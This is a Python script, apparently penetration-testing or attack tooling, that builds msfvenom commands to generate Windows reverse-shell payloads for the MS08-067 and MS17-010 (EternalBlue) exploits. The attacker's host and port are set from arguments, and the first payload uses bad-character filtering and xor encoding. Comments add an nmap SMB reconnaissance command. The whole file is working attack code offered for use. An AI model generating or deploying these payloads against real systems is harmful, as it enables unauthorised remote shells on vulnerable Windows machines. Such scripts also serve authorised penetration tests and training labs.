import socket
import subprocess
import argparse
from log_colors import *

# generate payload with msfvenom for
# exploitation ms08-067
# nmap has a good OS discovery script
# nmap -p 139,445 --script-args=unsafe=1 \
# --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1
class RevShellPayload():
    def __init__(self, host, port, fname):
        self.host = host
        self.port = port
        self.fname = fname

    # generate payload with msfvenom
    # encode payload with 1 iterations of x86/call4_dword_xor
    # x86/call4_dword_xor succeeded with size 348
    def generate(self):
        print (LogColors.BLUE + "attempting to generate reverse shell payload..." + LogColors.ENDC)
        msfv = "msfvenom -p windows/meterpreter/reverse_tcp"
        msfv += " -b \'\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\'"
        msfv += " -e x86/call4_dword_xor"
        msfv += " EXITFUNC=thread"
        msfv += " --nopsled=32"
        msfv += " LHOST=" + self.host
        msfv += " LPORT=" + self.port
        msfv += " -f python"
        msfv += " -v shellcode"
        msfv += " -a x86"
        msfv += " --platform windows"
        msfv += " -o " + self.fname
        print (LogColors.YELLOW + msfv + LogColors.ENDC)
        
        try:
            p = subprocess.Popen(msfv.split(), stdout = subprocess.PIPE)
            p.wait()
            print (LogColors.GREEN + "reverse shell payload successfully generated :)" + LogColors.ENDC)
        except Exception as e:
            print (LogColors.RED + "generate payload failed :(" + LogColors.ENDC)
    
    # generate payload eternal blue
    def generate_blue(self):
        print (LogColors.BLUE + "generate eternal blue payload..." + LogColors.ENDC)
        msfv = "msfvenom -p windows/shell_reverse_tcp"
        msfv += " LHOST=" + self.host
        msfv += " LPORT=" + self.port
        msfv += " EXITFUNC=thread"
        msfv += " -f exe -a x86 --platform windows"
        msfv += " -o " + self.fname
        print (LogColors.YELLOW + msfv + LogColors.ENDC)
        try:
            p = subprocess.Popen(msfv.split(), stdout = subprocess.PIPE)
            p.wait()
            print (LogColors.GREEN + "eternal blue payload successfully generated :)" + LogColors.ENDC)
        except Exception as e:
            print (LogColors.RED + "generate eternal blue payload failed :(" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-lh','--lhost', required = True, help = "the host")
    parser.add_argument('-p','--lport', required = True, help = "the port")
    parser.add_argument('-f','--filename', required = True, help = "filename (revpld.py, blue.exe)")
    parser.add_argument('-v','--vuln', default = "1", help = "1 - MS08-067, 2 - MS17-010 (eternal blue)")
    args = vars(parser.parse_args())
    host, port = args['lhost'], args['lport']
    filename = args['filename']
    vuln = int(args['vuln'])
    payload = RevShellPayload(host, port, filename)
    if vuln == 1:
        payload.generate()
    elif vuln == 2:
        payload.generate_blue()

